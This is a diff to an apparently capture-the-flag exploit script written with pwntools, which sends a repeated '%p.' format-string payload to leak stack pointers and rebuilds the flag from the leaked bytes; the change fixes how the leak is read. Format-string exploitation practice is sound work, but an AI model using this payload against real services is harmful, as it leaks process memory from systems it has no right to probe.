@@ -21,11 +21,15 @@ io.recvuntil(b"format:")
 # so its qwords appear among the leaked pointers; reassembling each as little-endian bytes rebuilds
 # the ASCII flag.
 io.sendline(b"%p." * 80)
-line = io.recvline(timeout=5).decode(errors="replace")
+# recvall, not recvline: recvuntil("format:") above stops at the colon and leaves the banner's
+# trailing "\n" in the buffer, so a single recvline() returns THAT leftover newline (an empty leak),
+# not the format-string output. The target is one-shot (read -> printf -> exit) and closes the
+# connection right after, so read everything up to EOF and scan the whole blob.
+data = io.recvall(timeout=3).decode("latin-1", "replace")
 io.close()
 
 out = bytearray()
-for tok in line.split("."):
+for tok in data.split("."):
     tok = tok.strip()
     if tok == "(nil)":
         out += b"\x00" * 8  # glibc prints (nil) for a null qword — keep byte alignment
@@ -42,6 +46,6 @@ if m:
     print(m.group(0))
 else:
     # residual slot mismatch: emit the raw leak so the exact window can be pinned from one run
-    sys.stderr.write("raw %p leak: " + line[:800] + "\n")
+    sys.stderr.write("raw %p leak: " + data[:800] + "\n")
     print("[!] flag not found in leak")
 PY
